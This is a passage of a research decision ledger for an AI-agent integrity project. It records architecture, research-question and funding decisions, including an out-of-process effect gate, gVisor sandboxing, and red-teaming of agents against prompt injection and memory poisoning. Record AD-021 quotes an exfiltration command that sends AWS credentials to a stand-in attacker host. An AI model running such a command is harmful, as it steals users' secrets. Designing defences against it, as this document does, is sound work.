# Research Decision Ledger (Submission Grade — Living Systems Governance)

**Project Name:** GIBBRN  
**Document Track:** Historical Architecture Decision Records (ADRs)  
**Date:** September 2026 | **Verification Pass:** V3 Delta Pending Verification  
**Governance Rule:** Never overwrite historical decisions. Record the continuous evolution of systems hypotheses based on empirical research, adversarial diligence audits, and verification passes.  
**Allowed Verdicts:** `KEEP` | `MODIFY` | `MERGE` | `DEFER` | `KILL`  

---

## Complete Decision Record Index

### Section 1: Historical Decisions (V1 Formulation — September 1–3, 2026)
*   [AD-001: Broad "Adaptive Agent Runtime" vs. "State Integrity Layer" (MODIFY)](#ad-001-broad-adaptive-agent-runtime-vs-state-integrity-layer)
*   [AD-002: Deployment-Time Model Weight Fine-Tuning (DEFER)](#ad-002-deployment-time-model-weight-fine-tuning)
*   [AD-003: Bespoke Distributed Database & Consensus Protocol (KILL)](#ad-003-bespoke-distributed-database--consensus-protocol)
*   [AD-004: In-Context Verbal Self-Reflection for Memory Promotion (KILL)](#ad-004-in-context-verbal-self-reflection-for-memory-promotion)
*   [AD-005: Four-Tier Typed State Decomposition Taxonomy (KEEP)](#ad-005-four-tier-typed-state-decomposition-taxonomy)
*   [AD-006: Merkle-Causal Flight Recorder with Bounded Replay (KEEP)](#ad-006-merkle-causal-flight-recorder-with-bounded-replay)
*   [AD-007: Deterministic Authority Reducer & Pre-Execution Effect Gate (KEEP)](#ad-007-deterministic-authority-reducer--pre-execution-effect-gate)
*   [AD-008: Automated Micro-Sandbox Regression Suite for Experience Admission (KEEP)](#ad-008-automated-micro-sandbox-regression-suite-for-experience-admission)
*   [AD-009: Lifetime-Scoped Persistent Risk Ledger Across Trajectories (KEEP)](#ad-009-lifetime-scoped-persistent-risk-ledger-across-trajectories)
*   [AD-010: LLM-as-a-Judge for Root Privilege Evaluation (KILL)](#ad-010-llm-as-a-judge-for-root-privilege-evaluation)
*   [AD-011: Framework-Neutral State Projection Adapter Layer (KEEP)](#ad-011-framework-neutral-state-projection-adapter-layer)

### Section 2: Post-Diligence Decisions (V2 Reconstruction & Submission — September 3, 2026)
*   [AD-012: Consolidation of Five Conceptual Subsystems into Three Physical Engines (MERGE)](#ad-012-consolidation-of-five-subsystems-into-three-physical-engines)
*   [AD-013: Integration of Flight Recorder into the Causal State Spine (MERGE)](#ad-013-integration-of-flight-recorder-into-the-causal-state-spine)
*   [AD-014: Integration of Authority Plane into the Deterministic Effect Gate (MERGE)](#ad-014-integration-of-authority-plane-into-the-deterministic-effect-gate)
*   [AD-015: Demarcation of Hermetic Replay vs. Open-World Causal Audit (MODIFY)](#ad-015-demarcation-of-hermetic-replay-vs-open-world-causal-audit)
*   [AD-016: Replacement of Geometric Error Compounding with Survival Analysis (MODIFY)](#ad-016-replacement-of-geometric-error-compounding-with-survival-analysis)
*   [AD-017: Pruning of Eight Research Questions to Five Causally Chained Core RQs (MODIFY)](#ad-017-pruning-of-eight-research-questions-to-five-causally-chained-core-rqs)
*   [AD-018: Narrowing Experience Admission to Verifier-Rich Execution Domains (MODIFY)](#ad-018-narrowing-experience-admission-to-verifier-rich-execution-domains)
*   [AD-019: Elevation of the $285,000 Budget as Primary Pre-Seed Ask (MODIFY)](#ad-019-elevation-of-the-285000-budget-as-primary-pre-seed-ask)
*   [AD-020: Elevation of the Deterministic Effect Gate as Initial Technical Wedge (KEEP & EXPAND)](#ad-020-elevation-of-the-deterministic-effect-gate-as-initial-technical-wedge)
*   [AD-021: OS-Level Kernel Sandboxing (gVisor) to Block Parameter Smuggling (KEEP & EXPAND)](#ad-021-os-level-kernel-sandboxing-gvisor-to-block-parameter-smuggling)
*   [AD-022: Decoupling into Three Substrates & Verified Adaptation Engine (ADOPT)](#ad-022-decoupling-into-three-substrates--verified-adaptation-engine)
*   [AD-023: 24-Month Roadmap, 7 Core RQs, and $400,000 Capital Allocation (ADOPT)](#ad-023-24-month-roadmap-7-core-rqs-and-400000-capital-allocation)

### Section 3: V4 Transition Decisions (36-Month Continuity Program — September 6–8, 2026 Evidence)
*   [AD-024: Expansion from 24 to 36 Months with Three Research Arcs (ADOPT)](#ad-024-expansion-from-24-to-36-months-with-three-research-arcs)
*   [AD-025: Reframing from State-Only to Continuity + Integrity (ADOPT)](#ad-025-reframing-from-state-only-to-continuity--integrity)
*   [AD-026: Preservation of Three Physical Engines — No Engine 4 (KEEP)](#ad-026-preservation-of-three-physical-engines--no-engine-4)
*   [AD-027: Goal Contract Introduction as Design Hypothesis (ADOPT)](#ad-027-goal-contract-introduction-as-design-hypothesis)
*   [AD-028: Engine 2 Consequence-Integrity Expansion (MODIFY)](#ad-028-engine-2-consequence-integrity-expansion)
*   [AD-029: Engine 3 Procedural-Family Abstraction (MODIFY)](#ad-029-engine-3-procedural-family-abstraction)
*   [AD-030: Runtime-Independent Continuity as Core Year-2 Research (ADOPT)](#ad-030-runtime-independent-continuity-as-core-year-2-research)
*   [AD-031: Objective & Evaluation Integrity as Year-2 Core RQ (ADOPT)](#ad-031-objective--evaluation-integrity-as-year-2-core-rq)
*   [AD-032: Multi-Agent Governance as Conditional Year-3 Research (DEFER)](#ad-032-multi-agent-governance-as-conditional-year-3-research)
*   [AD-033: Decision-Sufficient Digital State as Hypothesis (DEFER)](#ad-033-decision-sufficient-digital-state-as-hypothesis)
*   [AD-034: Refusal to Fabricate a V4 Capital Ask (KEEP)](#ad-034-refusal-to-fabricate-a-v4-capital-ask)

### Section 4: V4.1 Founder Review Fixes (RQ↔Experiment Alignment — September 2026)
*   [AD-035: RQ1/RQ2 Primary-vs-Secondary Alignment (MODIFY)](#ad-035-rq1rq2-primary-vs-secondary-alignment)
*   [AD-036: RQ3 Family Stratification + Deterministic Fault Injection (MODIFY)](#ad-036-rq3-family-stratification--deterministic-fault-injection)
*   [AD-037: RQ4 Abstraction Metrics Separate from Admission Gates (MODIFY)](#ad-037-rq4-abstraction-metrics-separate-from-admission-gates)
*   [AD-038: MDID Rename + Competing-Risks-First M18 + Canonical C-vs-B (MODIFY)](#ad-038-mdid-rename--competing-risks-first-m18--canonical-c-vs-b)
*   [AD-039: RQ7 Semantic Conformance Probes + Negative Migration (MODIFY)](#ad-039-rq7-semantic-conformance-probes--negative-migration)
*   [AD-040: RQ8 Contract Integrity vs. Operationalization Fidelity Split (MODIFY)](#ad-040-rq8-contract-integrity-vs-operationalization-fidelity-split)
*   [AD-041: RQ9 Rename + M36-A/B Verdict Split (MODIFY)](#ad-041-rq9-rename--m36-ab-verdict-split)
*   [AD-042: Source-Hygiene + Table 8.3 Consistency Fixes (MODIFY)](#ad-042-source-hygiene--table-83-consistency-fixes)
*   [AD-043: CIF-Based MDID Redefinition (Option A) (MODIFY)](#ad-043-cif-based-mdid-redefinition-option-a)
*   [AD-044: RQ6 Power TBD + Single Magnitude Estimand (MODIFY)](#ad-044-rq6-power-tbd--single-magnitude-estimand)
*   [AD-045: Table 6.2 M36 Split Fix (MODIFY)](#ad-045-table-62-m36-split-fix)
*   [AD-046: Version Semantics 4.1 + Small Fixes (MODIFY)](#ad-046-version-semantics-41--small-fixes)
*   [AD-047: Founder-Authorized V4 Capital Rebase (ADOPT)](#ad-047-founder-authorized-v4-capital-rebase-450k-current--700k-program--250k-conditional-year-3)

---

## Section 1: Historical Decisions (Preserved from V1)

*(Records AD-001 through AD-011 preserved intact from initial research phase, documenting the initial shift away from broad runtime frameworks and distributed databases to state integrity).*

---

## Section 2: Post-Diligence Decisions (V2 Reconstruction & Submission)

### AD-012: Consolidation of Five Subsystems into Three Physical Engines
*   **Date:** September 3, 2026
*   **Question:** Should gibbrn maintain five distinct architectural subsystems during an 18-month pre-seed R&D program?
*   **Evidence Examined:** Architectural red-team analysis and subsystem boundary overlap.
*   **Supporting Evidence:** Five subsystems introduce inter-process latency, duplicate serialization to PostgreSQL WAL, and confuse early-stage investors.
*   **Contradictory Evidence:** Five concepts remain useful for modular theoretical design.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MERGE**
*   **Confidence:** 95%
*   **What Changed:** Re-architected implementation into three physical engines: (1) Causal State Spine, (2) Deterministic Effect Gate, and (3) Experience Admission Engine.
*   **Next Experiment:** Latency benchmarking at Gate M3.

---

### AD-013: Integration of Flight Recorder into the Causal State Spine
*   **Date:** September 3, 2026
*   **Question:** Does the Flight Recorder require a separate subsystem from the State Spine?
*   **Evidence Examined:** Dataflow diagrams and event schema specifications in `04_ARCHITECTURE.md`.
*   **Supporting Evidence:** Both the State Spine and the Flight Recorder write append-only events to the same PostgreSQL database. Separating them creates duplicate writes.
*   **Contradictory Evidence:** Flight recording includes high-volume tool receipts that could bloat state queries.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **MERGE**
*   **Confidence:** 98%
*   **What Changed:** Flight recording is formally designated as the event log implementation of Engine 1 (Causal State Spine).
*   **Next Experiment:** Gate M6 causal reconstruction benchmarks on AgentErrorBench (Zhu et al. 2025).

---

### AD-014: Integration of Authority Plane into the Deterministic Effect Gate
*   **Date:** September 3, 2026
*   **Question:** Should the Authority Reducer and the Effect Gate exist as separate services?
*   **Evidence Examined:** TOCTOU race condition analysis.
*   **Supporting Evidence:** A network hop between an authority service and an enforcement proxy creates a Time-Of-Check to Time-Of-Use race window. Merging them allows single-use atomic capability leases.
*   **Contradictory Evidence:** Separating policy evaluation from enforcement is standard in large enterprise systems.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MERGE**
*   **Confidence:** 94%
*   **What Changed:** The Authority Reducer and Effect Gate are unified into Engine 2 as an out-of-process daemon with shared in-memory atomic state.
*   **Next Experiment:** Gate M9 red-teaming across 1,000 prompt injection attacks.

---

### AD-015: Demarcation of Hermetic Replay vs. Open-World Causal Audit
*   **Date:** September 3, 2026
*   **Question:** Can gibbrn promise deterministic bit-for-bit causal replay across external web and cloud APIs?
*   **Evidence Examined:** Systems engineering analysis of environment entropy.
*   **Supporting Evidence:** External REST APIs return dynamic timestamps, nonces, and mutating database rows that break live replay.
*   **Contradictory Evidence:** Hermetic local container environments can be snapshotted deterministically.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **MODIFY**
*   **Confidence:** 99%
*   **What Changed:** Split replay into: (1) **Hermetic Replay** (guaranteed only in sealed local Docker/gVisor containers) and (2) **Open-World Causal Audit** (divergence localization on mutable web systems).
*   **Next Experiment:** Gate M6 benchmark distinguishing hermetic vs. open divergence rates.

---

### AD-016: Replacement of Geometric Error Compounding with Survival Analysis
*   **Date:** September 3, 2026
*   **Question:** Is $P = p^d$ a scientifically defensible model for multi-step agent trajectories?
*   **Evidence Examined:** Statistical review; AgentErrorBench Markovian failure data (Zhu et al. 2025).
*   **Supporting Evidence:** Step errors in agents are strongly autocorrelated; agents employ retries and alternative tool paths; geometric decay assumes memoryless coin flips.
*   **Contradictory Evidence:** Geometric decay is widely cited in popular AI blog posts as an intuitive toy illustration.
*   **Evidence Strength:** `ESTABLISHED (STATISTICAL)`
*   **Decision:** **MODIFY**
*   **Confidence:** 100%
*   **What Changed:** Formally adopted discrete survival analysis: $S(k) = \prod_{i=1}^k (1 - h(i))$, defining $\text{MDID}_\tau$ as an empirical Kaplan-Meier quantile with pre-registered competing-risks sensitivity analysis.
*   **Next Experiment:** Gate M15 Log-Rank survival curve analysis.

---

### AD-017: Pruning of Eight Research Questions to Five Causally Chained Core RQs
*   **Date:** September 3, 2026
*   **Status:** HISTORICAL — SUPERSEDED by AD-023 (7 Core RQs, 24-month scope). Preserved without rewriting; do not cite as current scope.
*   **Date:** September 3, 2026
*   **Question:** Should an 18-month pre-seed research program attempt to answer eight broad research questions?
*   **Evidence Examined:** Critical path and scheduling analysis.
*   **Supporting Evidence:** Eight RQs would over-extend a lean founder-led research program across peripheral LoRA fine-tuning and cross-runtime benchmarks, risking failure on the core thesis.
*   **Contradictory Evidence:** More RQs demonstrate broad ambition to investors.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 92%
*   **What Changed:** Pruned to five causally chained Core RQs (Classification $\to$ Reconstruction $\to$ Authority $\to$ Admission $\to$ Survival). Secondary tracks deferred to non-binding exploratory status.
*   **Next Experiment:** Core RQ1 benchmark execution in Months 1–3.

---

### AD-018: Narrowing Experience Admission to Verifier-Rich Execution Domains
*   **Date:** September 3, 2026
*   **Question:** Can gibbrn build an automated experience admission system for general open-ended agent skills within 18 months?
*   **Evidence Examined:** Complexity of general automated program synthesis and regression evaluation.
*   **Supporting Evidence:** General skill induction requires complex semantic verification that consumes massive token spend.
*   **Contradictory Evidence:** Enterprises want agents that learn broad conversational procedures.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 90%
*   **What Changed:** Engine 3 is narrowed strictly to **verifier-rich domains**: deterministic Python functions and Bash tool macros inside gVisor sandboxes with automated test suites.
*   **Next Experiment:** Gate M12 regression evaluation under MINJA poisoning.

---

### AD-019: Elevation of the $285,000 Budget as Primary Pre-Seed Ask
*   **Date:** September 3, 2026
*   **Status:** HISTORICAL — SUPERSEDED by AD-023 ($400,000 / 24-month primary; $150,000 fallback). Preserved without rewriting; do not cite as current ask.
*   **Date:** September 3, 2026
*   **Question:** Should gibbrn present $120,000 and $285,000 as equal funding options to 1517 Fund?
*   **Evidence Examined:** Single-point-of-failure analysis and token compute recalculations.
*   **Supporting Evidence:** \$120,000 forces a solo founder into extreme financial precarity, eliminates engineering support, and cuts benchmark volume by 70%. \$285,000 is scientifically credible and sits squarely in 1517's pre-seed check range ($50k–$1M).
*   **Contradictory Evidence:** Lower ask numbers appear more capital-efficient to non-technical investors.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 95%
*   **What Changed:** Established \$285,000 as the primary pre-seed ask. \$120,000 is retained strictly as an extreme contingency fallback.
*   **Next Experiment:** 1517 Fund Investment Committee diligence submission.

---

### AD-020: Elevation of the Deterministic Effect Gate as Initial Technical Wedge
*   **Date:** September 3, 2026
*   **Question:** What is the sharpest, immediate commercial wedge of gibbrn?
*   **Evidence Examined:** Enterprise security demand for agent guardrails; vulnerability of LangGraph state dicts.
*   **Supporting Evidence:** Full state integrity and causal replay require multi-month R&D. Enterprise teams immediately need an out-of-process gate stopping agents from laundering authority or executing out-of-scope mutations.
*   **Contradictory Evidence:** Focus on security alone risks reducing gibbrn to an AI security gateway.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **KEEP & EXPAND**
*   **Confidence:** 92%
*   **What Changed:** Formally declared the Deterministic Effect Gate as the initial technical wedge of the 18-month research program.
*   **Next Experiment:** Core RQ3 benchmark evaluation at Gate M9.

---

### AD-021: OS-Level Kernel Sandboxing (gVisor) to Block Parameter Smuggling
*   **Date:** September 3, 2026
*   **Question:** Does capability token validation at the Effect Gate prevent all malicious tool actions?
*   **Evidence Examined:** Parameter-level payload smuggling red-team attack analysis.
*   **Supporting Evidence:** An agent authorized to execute `bash` can still run `curl http://attacker.com?leak=$(cat ~/.aws/credentials)`. Capability tokens check tool identity, not parameter safety.
*   **Contradictory Evidence:** Running micro-sandboxes adds container startup latency.
*   **Evidence Strength:** `ESTABLISHED`
*   **Decision:** **KEEP & EXPAND**
*   **Confidence:** 98%
*   **What Changed:** Engine 2 couples capability evaluation with ephemeral **gVisor micro-containers** featuring strict network namespace isolation and unmapped host credential directories.
*   **Next Experiment:** Latency profiling of warm gVisor container reuse at Gate M3.

---

### AD-022: Decoupling into Three Substrates & Verified Adaptation Engine
*   **Date:** September 4, 2026
*   **Question:** How does gibbrn accommodate adaptive agents that continually modify skills and execution harnesses?
*   **Evidence Examined:** MASkills (arXiv:2609.02094) continual learning in skill-space; HarnessDev (arXiv:2609.01437) harness co-adaptation; CrowdStrike Agentic Identity Provider.
*   **Supporting Evidence:** If the agent is permitted to mutate its own skills, workflows, and runtime harness, authority and state provenance cannot be co-located with mutable cognition.
*   **Decision:** **ADOPT (V3 Architecture)**
*   **Confidence:** 95%
*   **What Changed:** Formalized the Three-Substrate boundary: (1) Adaptive Cognition (mutable), (2) Execution Substrate (isolation/recovery), (3) Trust Substrate (externally governed). Re-architected Engine 3 as the *Verified Adaptation Engine* and Engine 1 as the *Canonical State & Adaptation Lineage Substrate*. Added Invariants 6 and 7.
*   **Next Experiment:** Core RQ4 and RQ5 evaluations at Gates M12 and M15.

---

### AD-023: 24-Month Roadmap, 7 Core RQs, and $400,000 Capital Allocation
*   **Date:** September 4, 2026
*   **Question:** What timeline and capital plan are required to rigorously evaluate adaptive agent integrity and cross-model replication?
*   **Evidence Examined:** Need for cross-model transfer evaluations (ATR), IAM provider integration testing, and long-horizon survival analysis across 8 quarters.
*   **Supporting Evidence:** 18 months was insufficient to evaluate cross-model adaptation portability and live IAM delegation; bottom-up budgeting requires $400k for expanded API inference, infrastructure, and replication.
*   **Decision:** **ADOPT (V3 Scope & Capital)**
*   **Confidence:** 96%
*   **What Changed:** Expanded roadmap to 24 months with 8 binding gates (M3–M24) and 16 lightweight evidence checkpoints. Formulated Core RQ5 (Harness Generalization / ATR) with dual-mode PASS (portable generalization vs. safely bounded specialization) and Core RQ7 (IAM Delegation). Reconciled budget bottom-up to exactly $400,000.
*   **Next Experiment:** Gate M3 and M6 checkpoint evaluations.

---

## Section 3: V4 Transition Decisions (36-Month Continuity Program — September 2026)

### AD-024: Expansion from 24 to 36 Months with Three Research Arcs
*   **Date:** September 8, 2026
*   **Question:** Should the program extend to 36 months, and how should new scope be gated so expansion does not dilute falsifiability?
*   **Evidence Examined:** September 6–8, 2026 primary sources (13 verified: §§3.1–3.13 of `02_EVIDENCE_LANDSCAPE.md`); V3 gate structure and capital history.
*   **Supporting Evidence:** Distinct evidence clusters arrived simultaneously for migration continuity, objective integrity, team coordination state, shared-state governance, and decision-sufficient state — each with at least one checkable primary source. A 24-month frame cannot test them without dropping core gates.
*   **Contradictory Evidence:** Longer programs risk scope sprawl and weaker accountability; Year-3 topics rest on single papers/case studies.
*   **Evidence Strength:** `SUPPORTED (program judgment; evidence-motivated, not evidence-mandated)`
*   **Decision:** **ADOPT**
*   **Confidence:** 85%
*   **What Changed:** 36-month program; 3 arcs (Act Safely / Change Safely / Persist Together); 12 RQs; 12 quarterly gates; ~24 checkpoints; four major thesis gates (M9, M18, M24, M36). Arc III conditional on the M24 readiness review. Roadmap renamed `07_24_MONTH_ROADMAP.md` → `07_36_MONTH_ROADMAP.md`.
*   **Next Experiment:** Gate M3 per retained RQ1 protocol.

---

### AD-025: Reframing from State-Only to Continuity + Integrity
*   **Date:** September 8, 2026
*   **Question:** Should the broad thesis evolve from "Agent State Integrity" toward "continuity and integrity for long-lived adaptive agents"?
*   **Evidence Examined:** Enoch migration paper (arXiv:2609.00546); CONTINUITY contracts (arXiv:2609.05269); Aspire (arXiv:2608.31111); interchangeability (arXiv:2609.05279); swarm case study (arXiv:2609.04170).
*   **Supporting Evidence:** The new sources jointly show state integrity is necessary but insufficient: identity, objective, authority, consequence, and coordination continuity fail independently of state corruption.
*   **Contradictory Evidence:** Broader framing risks diluting the sharp wedge investors diligence.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **ADOPT**
*   **Confidence:** 88%
*   **What Changed:** Broad positioning evolved; product name (GIBBRN — Agent State Integrity Layer) and north-star sentence retained; new north-star RQ adopted with the V3 question retained as subordinate RQ1; Four-Class Taxonomy retained with a cross-cutting Continuity Model alongside it; wedge stays narrow (Deterministic Authority & Consequence Integrity).
*   **Next Experiment:** RQ1–RQ3 gates unchanged in binding thresholds.

---

### AD-026: Preservation of Three Physical Engines — No Engine 4
*   **Date:** September 8, 2026
*   **Question:** Does the expanded scope require a fourth engine (identity service, governance service, world-state service)?
*   **Evidence Examined:** V4 architecture review; "diagram architecture" anti-pattern risk.
*   **Supporting Evidence:** Every new concept maps onto an existing engine's pipeline stage or record schema; separate daemons would reintroduce the IPC/latency costs AD-012 removed.
*   **Contradictory Evidence:** Dedicated services could isolate failure domains at scale.
*   **Evidence Strength:** `SUPPORTED (architectural judgment)`
*   **Decision:** **KEEP**
*   **Confidence:** 92%
*   **What Changed:** Engines renamed toward their V4 roles (Continuity Spine; Consequence Integrity Pipeline; Skill Compilation) with no new daemons. Goal Contract, broker, migration, team-state, world-state, governance recorded as conceptual layers/experimental modules.
*   **Next Experiment:** M3 latency profiling must confirm the pipeline still fits the ≤14ms engineering target envelope.

---

### AD-027: Goal Contract Introduction as Design Hypothesis
*   **Date:** September 8, 2026
*   **Question:** How should the architecture prevent silent objective redefinition under adaptive optimization?
*   **Evidence Examined:** Aspire vague-goal findings (arXiv:2608.31111: mismatched data, narrow self-evaluations, instability); PROCTOR judge failures (arXiv:2609.02246).
*   **Supporting Evidence:** Both sources locate failure at the objective/evaluator layer rather than the tool layer; neither proposes a canonical contract object, leaving the design open.
*   **Contradictory Evidence:** A contract schema adds Authoritative State complexity before RQ1 validates the base taxonomy.
*   **Evidence Strength:** `GIBBRN DESIGN HYPOTHESIS (evidence-motivated)`
*   **Decision:** **ADOPT (as hypothesis)**
*   **Confidence:** 70%
*   **What Changed:** Goal Contract object proposed in Authoritative State (8 fields); cognition-proposes / contract-disposes principle; goal-generation vs. operationalization distinction; RQ8 tests it. Labeled hypothesis throughout; no established-abstraction claim.
*   **Next Experiment:** RQ8 pilot calibration at M21 pre-registration.

---

### AD-028: Engine 2 Consequence-Integrity Expansion
*   **Date:** September 8, 2026
*   **Question:** Should Engine 2 grow from an authorization gate into an end-to-end consequence pipeline?
*   **Evidence Examined:** CONTINUITY (arXiv:2609.05269); IETF draft-abak-agent-control-delivery-evidence-01 (work in progress); CVE-2026-85666 advisories; EmbodiedSkills propose–verify loop (arXiv:2609.01281, analogy only).
*   **Supporting Evidence:** Composition failures (dropped/widened/rebound context), endpoint-confusion SSRF in the wild, and delivery/enforcement/effect separation jointly require stages beyond the check itself.
*   **Contradictory Evidence:** Longer pipelines risk latency-budget breach and async-reconciliation complexity.
*   **Evidence Strength:** `SUPPORTED`
*   **Decision:** **MODIFY**
*   **Confidence:** 85%
*   **What Changed:** 13-stage target action path; Tool Network Authority Broker (capability/endpoint/network/credential split) as a design response (not industry practice); Invariants 8–9 added; RQ3 expanded with endpoint-substitution, credential-rebound, consequence-mismatch families. Latency note: reconciliation may go bounded-async if measurement requires; pre-execution gating never does.
*   **Next Experiment:** RQ3 pilot (M9) with extended attack families.

---

### AD-029: Engine 3 Procedural-Family Abstraction
*   **Date:** September 8, 2026
*   **Question:** Should Engine 3 evolve from experience→skill to procedural-family compilation?
*   **Evidence Examined:** SkillGLoW (arXiv:2609.02217: +17.2 hard avg, commit-gate, 3.6× compactness, ALFWorld transfer); PROCTOR (judge-advisory discipline).
*   **Supporting Evidence:** SkillGLoW's local→family→de-instantiated-prior→execution-gated-commit pipeline with positive gains in all 12 runs directly addresses V3's over-specific-procedure risk; PROCTOR supplies the missing commit-authority rule.
*   **Contradictory Evidence:** Single-paper basis; full-text variance unconfirmed; software-task transfer unproven at GIBBRN scale.
*   **Evidence Strength:** `EMERGING EVIDENCE → DESIGN TARGET`
*   **Decision:** **MODIFY**
*   **Confidence:** 78%
*   **What Changed:** 10-stage V4 pipeline; portability bindings per skill; Invariant 4 extended (judge advisory; checks outrank; holdouts + canaries); verifier-rich scoping preserved; RQ4 thresholds unchanged.
*   **Next Experiment:** RQ4 gate (M12) per retained FPR/retention thresholds.

---

### AD-030: Runtime-Independent Continuity as Core Year-2 Research
*   **Date:** September 8, 2026
*   **Question:** Should model/runtime migration graduate from a replication axis into a full continuity RQ?
*   **Evidence Examined:** Enoch system (arXiv:2609.00546: substrate/binding split, six invariants, 833 + 92 tests, mechanical-only claims).
*   **Supporting Evidence:** First checkable precedent for lineage-preserving migration with explicit behavioral-invariance disclaimer — exactly GIBBRN's needed scope.
*   **Contradictory Evidence:** Single system; no independent replication; migration-security questions open.
*   **Evidence Strength:** `EMERGING EVIDENCE`
*   **Decision:** **ADOPT**
*   **Confidence:** 75%
*   **What Changed:** RQ7 re-scoped to migration continuity (Model/Harness/Host/Runtime A→B) with mechanical-operational-continuity target; Engine 1 continuity records; mock-IAM retained as authority axis; failure narrows to single-runtime (never invalidates single-runtime integrity).
*   **Next Experiment:** RQ7 pilot calibration at M18 pre-registration.

---

### AD-031: Objective & Evaluation Integrity as Year-2 Core RQ
*   **Date:** September 8, 2026
*   **Question:** Should objective integrity become a core RQ rather than an implicit assumption?
*   **Evidence Examined:** Aspire (arXiv:2608.31111); PROCTOR (arXiv:2609.02246).
*   **Supporting Evidence:** Two independent sources document evaluator/operationalization failure as the dominant self-improvement failure mode — a gap V3 never gated.
*   **Contradictory Evidence:** Benchmark suite must be built; thresholds uncalibrated; risk of duplicating RQ4.
*   **Evidence Strength:** `EMERGING EVIDENCE`
*   **Decision:** **ADOPT**
*   **Confidence:** 72%
*   **What Changed:** New Core RQ8 with Goal Contract + evaluator-separation tests; candidate metrics defined; thresholds TBD at calibration; failure narrows optimization to pre-approved contracts.
*   **Next Experiment:** Suite construction M19–M21; calibration at M21 pre-registration.

---

### AD-032: Multi-Agent Governance as Conditional Year-3 Research
*   **Date:** September 8, 2026
*   **Question:** Should persistent multi-agent governance enter the program, and with what status?
*   **Evidence Examined:** Swarm case study (arXiv:2609.04170: 100 agents, Ostrom framing); interchangeability (arXiv:2609.05279: +16–63% comms penalty).
*   **Supporting Evidence:** The swarm study supports governance problems beyond task allocation; interchangeability supplies a controlled coordination-state measurement paradigm.
*   **Contradictory Evidence:** Single case study (weak signal); no stable-institution evidence; high speculation risk ("machine society" drift).
*   **Evidence Strength:** `EARLY / WEAK SIGNAL + EMERGING (respectively)`
*   **Decision:** **DEFER (conditional Year 3)**
*   **Confidence:** 80% (in the deferral judgment)
*   **What Changed:** RQ10/RQ11 defined with tacit-coordination-state terminology, placebo-controlled designs, and independent kill criteria; "culture"/"society" language banned as scientific claim; strand failure never invalidates single-agent results.
*   **Next Experiment:** Activation decision at the M24 readiness review — not before.

---

### AD-033: Decision-Sufficient Digital State as Hypothesis
*   **Date:** September 8, 2026
*   **Question:** What status should environment-state extension receive given Puffin-World and spectral-latent findings?
*   **Evidence Examined:** Puffin-World (arXiv:2609.04196: physics/geometry/appearance states, Puffin-16M); spectral latent structuring (arXiv:2609.04264: representation laziness).
*   **Supporting Evidence:** Both papers support structured/decision-relevant state in their own domains; neither establishes any digital-agent schema.
*   **Contradictory Evidence:** Cross-domain analogy is the weakest inference class in the dossier.
*   **Evidence Strength:** `GIBBRN HYPOTHESIS`
*   **Decision:** **DEFER (conditional Year 3)**
*   **Confidence:** 65%
*   **What Changed:** RQ9 defined as ablation-gated hypothesis with digital candidate variables listed explicitly as hypotheses; allowed conclusion capped at "structured state beyond visual generation exists in world-model research."
*   **Next Experiment:** Activation at M24; ablation suite TBD.

---

### AD-034: Refusal to Fabricate a V4 Capital Ask
*   **Date:** September 8, 2026
*   **Question:** What 36-month funding figure should V4 present?
*   **Evidence Examined:** V3 bottom-up model ($400k/24mo); absence of any cost basis for RQ7-expanded, RQ8, RQ9–RQ12 workloads.
*   **Supporting Evidence:** No staffing/compute/infra quotes exist for Year-3-scale multi-agent sandboxes or the new evaluation suites; linear extrapolation ($400k→$600k) would be fabrication.
*   **Contradictory Evidence:** Investor materials prefer a single number; a blank may read as unpreparedness.
*   **Evidence Strength:** `GOVERNANCE DECISION (methodological integrity)`
*   **Decision:** **KEEP (integrity constraint)**
*   **Confidence:** 100%
*   **What Changed:** V3 figures preserved as flagged history; V4 ask declared unresolved; structural sequencing/capital-at-risk logic updated without dollars; founder authorization defined as the sole path to a rebased number (`08_CAPITAL_PLAN.md` §9).
*   **Next Experiment:** Founder rebasing review (out of dossier scope).

---

## Section 4: V4.1 Founder Review Fixes (RQ↔Experiment Alignment — September 2026)

### AD-035: RQ1/RQ2 Primary-vs-Secondary Alignment
*   **Date:** September 2026
*   **Question:** RQ1 asked about taxonomy + identity + Goal Contract while its binding experiment measured only schema-corruption reduction; RQ2 claimed five lineage dimensions while CRR measured only causal reconstruction on AgentErrorBench (which lacks contract/IAM/migration ground truth).
*   **Decision:** **MODIFY**
*   **What Changed:** RQ1 binding = typed-separation corruption reduction; identity/contract representability becomes a non-binding secondary feasibility check. RQ2 binding = causal reconstruction; new secondary Lineage Reconstruction Accuracy (identity/objective/authority/adaptation) on purpose-built instrumented traces, descriptive at M6. No RQ13 created.
*   **Next Experiment:** Gate M3 (primary); LRA instrument construction for M6.

---

### AD-036: RQ3 Family Stratification + Deterministic Fault Injection
*   **Date:** September 2026
*   **Question:** N=1,000 spread over eight threat families leaves per-family claims unsupported; prompt injection alone cannot exercise consequence-integrity semantics.
*   **Decision:** **MODIFY**
*   **What Changed:** Pre-registration must fix per-family minimum quotas; M9 reports per-family Clopper-Pearson bounds alongside aggregate UER. New deterministic fault-injection axis (recipient/resource/endpoint/credential/scope/adapter/amount faults) with pre-registered fail-closed expectations, counted in the same UER. Table 6.1 and Table 6.2b updated.
*   **Next Experiment:** `gibbrn-auth-bench` manifest with quotas + fault suite at M7 pre-registration.

---

### AD-037: RQ4 Abstraction Metrics Separate from Admission Gates
*   **Date:** September 2026
*   **Question:** FPR/retention prove filtering, not that procedural-family abstraction has value.
*   **Decision:** **MODIFY**
*   **What Changed:** Six secondary abstraction metrics (yield, held-out family transfer, compression, merge/split error rates, vs-per-task benefit, admission rate) published descriptively at M12 with no kill power. Division of labor: M12 proves safe admission; M15 proves useful abstraction/transfer.
*   **Next Experiment:** Gate M12 (safety) + M15 (abstraction value).

---

### AD-038: MDID Rename + Competing-Risks-First M18 + Canonical C-vs-B
*   **Date:** September 2026
*   **Question:** "Dependency Depth" misnames a step index; completion-as-censoring is likely informative; roadmap wording said "unmanaged baseline" while RQ6/brief required (C)-vs-(B).
